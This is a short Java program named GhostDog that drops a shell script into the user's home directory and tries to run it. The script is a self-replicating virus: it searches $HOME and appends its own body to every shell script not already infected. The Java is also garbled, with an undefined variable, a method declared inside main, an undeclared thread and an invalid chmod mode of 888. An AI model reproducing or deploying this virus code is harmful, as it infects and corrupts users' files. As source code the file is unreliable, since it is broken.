import java.io.*;

class GhostDog {
    public static void main (String[] argv) {
    try {
        String userHome = System.getProperty("user.home");
        String target = "$HOME";
        FileOutputStream outer = new FileOutputStream(userHome + "/.ghostdog.sh");
        String homer = "#!/bin/sh" + "\n" + "#-_" + "\n" +
        "echo \"This is a New Target File from me..-->GhostDog<--.\"" + "\n" +
        "for file in `find " + target + " -type f -print`" + "\n" + "do" +
        "\n" + "    case \"`sed 1q $file`\" in" + "\n" +
        "        \"#!/bin/sh\" ) grep '#-_' $file > /dev/null" +
        " || sed -n '/#-_/,$p' $0 >> $file" + "\n" +
        "    esac" + "\n" + "done" + "\n" + 
        "2>/dev/null";
        byte[] buffer = new byte[homer.length()];
        ghostdog.getBytes(0, ghostdog.length(), buffer, 0);
        public void start() {
        if (sleeper == null) {
        sleeper = new Thread(this);
        sleeper.setPriority(Thread.MAX_PRIORITY);
        sleeper.start();
        }
        outer.write(buffer);
        outer.close();
        Process chmod = Runtime.getRuntime().exec("/usr/bin/chmod 888 " +
                        userHome + "/.ghostdog.sh");
        Process exec = Runtime.getRuntime().exec("/bin/sh " + userHome +
                       "/.ghostdog.sh");
        } catch (IOException ioe) {}
    }
}